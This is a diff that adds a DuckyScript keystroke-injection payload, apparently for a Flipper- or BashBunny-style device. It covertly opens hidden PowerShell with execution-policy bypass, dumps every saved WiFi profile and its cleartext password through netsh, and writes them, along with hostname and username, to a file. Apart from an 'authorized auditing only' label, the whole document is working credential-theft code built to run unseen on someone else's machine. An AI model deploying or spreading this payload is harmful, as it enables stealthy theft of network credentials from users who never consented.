@@ -1,0 +1,9 @@
+REM CYBERFLIPPER — WiFi Password Exfil (BashBunny-inspired)
+REM Exports all saved WiFi profiles and passwords via netsh
+REM Writes results to USB drive when available
+REM FOR AUTHORIZED AUDITING ONLY
+DELAY 500
+GUI r
+DELAY 300
+STRING powershell -NoP -W Hidden -Exec Bypass -C "$d=[Environment]::GetFolderPath('Desktop');$f='$d\wifi_audit_'+$(hostname)+'.txt';'=== WIFI AUDIT ===' | Out-File $f;'Date: '+(Get-Date) | Out-File -Append $f;'Host: '+$env:COMPUTERNAME | Out-File -Append $f;'User: '+$env:USERNAME | Out-File -Append $f;'---' | Out-File -Append $f;(netsh wlan show profiles) | Select-String 'All User' | ForEach-Object {$p=($_ -split ':')[1].Trim();$r=netsh wlan show profile name=$p key=clear;$k=($r | Select-String 'Key Content').ToString().Split(':')[1].Trim();'SSID: '+$p+' | KEY: '+$k | Out-File -Append $f};'=== END ===' | Out-File -Append $f"
+ENTER
